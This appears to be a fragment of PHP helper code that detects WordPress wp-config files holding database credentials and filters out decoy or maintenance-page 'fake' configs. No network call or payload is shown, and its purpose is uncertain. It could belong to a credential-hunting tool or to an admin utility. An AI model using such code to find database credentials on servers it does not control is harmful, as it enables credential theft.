function ba_esc($s)
{
    return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8');
}

function ba_is_cli()
{
    return (php_sapi_name() === 'cli' || defined('STDIN'));
}

function ba_is_fake_config($file)
{
    if (!is_file($file) || !is_readable($file)) {
        return false;
    }
    $txt = @file_get_contents($file, false, null, 0, 8192);
    if ($txt === false) {
        return false;
    }
    if (stripos($txt, '<!DOCTYPE') !== false || stripos($txt, '<html') !== false) {
        return true;
    }
    if (stripos($txt, 'Under Maintenance') !== false || stripos($txt, '<body') !== false) {
        return true;
    }
    if (stripos($txt, '<?php') === false && stripos($txt, '<?') === false) {
        if (stripos($txt, 'DB_NAME') === false) {
            return true;
        }
    }
    return false;
}

function ba_is_wp_config($file)
{
    if (!is_file($file) || !is_readable($file)) {
        return false;
    }
    if (ba_is_fake_config($file)) {
        return false;
    }
    $txt = @file_get_contents($file);
    if ($txt === false || strlen($txt) < 20) {
        return false;
    }
    if (stripos($txt, 'DB_NAME') !== false && (stripos($txt, 'DB_USER') !== false || stripos($txt, 'DB_PASSWORD') !== false)) {
        return true;
    }
    if (preg_match('/\$table_prefix/', $txt) && stripos($txt, 'DB_') !== false) {
        return true;
    }
    if (preg_match('/require(?:_once)?\s*[\(\s][\'"][^\'"]*wp-config[^\'"]*[\'"]/', $txt)) {
        return true;
    }
    return false;
}

